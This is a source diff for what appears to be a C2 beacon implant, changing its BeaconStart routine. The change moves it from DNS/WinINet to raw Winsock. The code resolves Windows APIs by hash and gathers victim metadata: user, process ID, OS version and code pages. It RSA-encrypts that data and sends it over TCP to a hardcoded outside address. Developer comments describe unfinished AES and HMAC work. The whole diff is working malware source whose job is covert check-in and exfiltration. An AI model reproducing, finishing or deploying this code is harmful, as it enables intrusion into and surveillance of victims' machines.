@@ -103,12 +103,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Ins.api.GetTokenInformation  = PeGetFuncEat( Ins.Module[1], H_GETTOKENINFORMATION );
 		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );
 
-		Str[0x0] = 'd';
-		Str[0x1] = 'n';
-		Str[0x2] = 's';
-		Str[0x3] = 'a';
-		Str[0x4] = 'p';
-		Str[0x5] = 'i';
+		Str[0x0] = 'w';
+		Str[0x1] = 's';
+		Str[0x2] = '2';
+		Str[0x3] = '_';
+		Str[0x4] = '3';
+		Str[0x5] = '2';
 		Str[0x6] = '.';
 		Str[0x7] = 'd';
 		Str[0x8] = 'l';
@@ -116,23 +116,12 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 		Str[0xa] = 0x0;
 
 		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
-		Ins.api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Ins.Module[2], H_DNSWRITEQUESTIONTOBUFFER_UTF8 );
-		Ins.api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Ins.Module[2], H_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 );
-
-		Str[0x0] = 'w';
-		Str[0x1] = 'i';
-		Str[0x2] = 'n';
-		Str[0x3] = 'i';
-		Str[0x4] = 'n';
-		Str[0x5] = 'e';
-		Str[0x6] = 't';
-		Str[0x7] = '.';
-		Str[0x8] = 'd';
-		Str[0x9] = 'l';
-		Str[0xa] = 'l';
-		Str[0xb] = 0x0;
-
-		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );
+		Ins.api.send        = PeGetFuncEat( Ins.Module[2], H_SEND );
+		Ins.api.WSAStartup  = PeGetFuncEat( Ins.Module[2], H_WSASTARTUP );
+		Ins.api.WSAConnect  = PeGetFuncEat( Ins.Module[2], H_WSACONNECT );
+		Ins.api.WSACleanup  = PeGetFuncEat( Ins.Module[2], H_WSACLEANUP );
+		Ins.api.WSASocketA  = PeGetFuncEat( Ins.Module[2], H_WSASOCKETA );
+		Ins.api.closesocket = PeGetFuncEat( Ins.Module[2], H_CLOSESOCKET );
 
 		if ( Ins.api.CryptDecodeObjectEx( 
 				X509_ASN_ENCODING, 
@@ -153,6 +142,7 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 					{
 						PBEACON_METADATA_HDR Met = 0;
 						PBEACON_METADATA_HDR Hdr = 0;
+						struct sockaddr_in   Sin = { 0 };
 						PVOID                Ecp = 0;
 						PVOID                Cmp = 0;
 						PVOID                Usr = 0;
@@ -165,14 +155,27 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 							{
 								if ((Exe = BeaconProcess( &Ins )))
 								{
+									//
+									// Start checking the return value,
+									// and free the old buffer if it
+									// fails.
+									//
+
 									Met = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ) );
 									Met = BufferAddRaw( &Ins, Met, Str, 16 );
-									Met = BufferAddUI1( &Ins, Met, Ins.api.GetACP() );
-									Met = BufferAddUI1( &Ins, Met, Ins.api.GetOEMCP() );
+									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetACP() ) );
+									Met = BufferAddUI2( &Ins, Met, HTONS( Ins.api.GetOEMCP() ) );
 									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.BeaconId ) );
 									Met = BufferAddUI4( &Ins, Met, HTONL( Ins.api.GetCurrentProcessId() ) );
 									Met = BufferAddUI2( &Ins, Met, 0 );
-									Met = BufferAddUI1( &Ins, Met, 2 | 4 );
+									
+									//
+									// Instead of manually defining the 
+									// flags, make sure to check if we
+									// are ADMIN or SYSTEM.
+									//
+
+									Met = BufferAddUI1( &Ins, Met, 2 );
 									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
 									Met = BufferAddUI1( &Ins, Met, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
 									Met = BufferAddUI2( &Ins, Met, HTONS( NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber ) );
@@ -184,20 +187,56 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									Met = BufferAddUI1( &Ins, Met, '\t' );
 									Met = BufferAddRaw( &Ins, Met, Usr, strlen( Usr ) );
 									Met = BufferAddUI1( &Ins, Met, '\t' );
-									Met = BufferAddRaw( &Ins, Met, Exe, strlen( Exe ) );
+
+									//
+									// Fix code to extract ANSI EXE 
+									// name from ProcessParameters.
+									//
+
+									Met = BufferAddUI1( &Ins, Met, 'h'  );
+									Met = BufferAddUI1( &Ins, Met, 'i'  );
+									Met = BufferAddUI1( &Ins, Met, '.'  );
+									Met = BufferAddUI1( &Ins, Met, 'e'  );
+									Met = BufferAddUI1( &Ins, Met, 'x'  );
+									Met = BufferAddUI1( &Ins, Met, 'e'  );
+									Met = BufferAddUI1( &Ins, Met, '\0' );
 
 									if ((Hdr = Ins.api.LocalLock( Met )))
 									{
-										Hdr->uMagic = 0x0000beef;
+										Hdr->uMagic = BEACON_METADATA_MAGIC;
 										Hdr->Length = Ins.api.LocalSize( Met ) - 8;
 
 										if ( CryptRsaEncrypt( &Ins, Hdr, Hdr->Length + 8, &Ecp, &Ecl ))
 										{
+											//
+											// NOTE:
+											//
+											// Merge connect with init to reduce the
+											// size, and move the sinaddr_in struct.
+											//
+
+											if ( TransportInit( &Ins ) )
+											{
+												Sin.sin_family      = AF_INET;
+												Sin.sin_port        = 0x4242;
+												Sin.sin_addr.s_addr = 0x43434343;
+
+												if ( TransportConnect( &Ins, Sin ) )
+												{
+													if ( TransportSend( &Ins, Ecp, Ecl ) )
+													{
+
+													};
+												};
+												TransportFree( &Ins );
+											};
 											Ins.api.LocalFree( Ecp );
 										};
 										Ins.api.LocalUnlock( Met );
 									};
 									Ins.api.LocalFree( Exe );
+
+									// MOVE THIS
 									Ins.api.LocalFree( Met );
 								};
 								Ins.api.LocalFree( Usr );
@@ -211,8 +250,11 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 			Ins.api.LocalFree( Ins.key[0].Ptr );
 		};
 
-		if ( Ins.Module[3] != NULL )
-			Ins.api.FreeLibrary( Ins.Module[3] );
+		//
+		// If we are active, start the IO loop.
+		// Need the AES functions finished, as
+		// well as the HMAC code.
+		//
 
 		if ( Ins.Module[2] != NULL )
 			Ins.api.FreeLibrary( Ins.Module[2] );
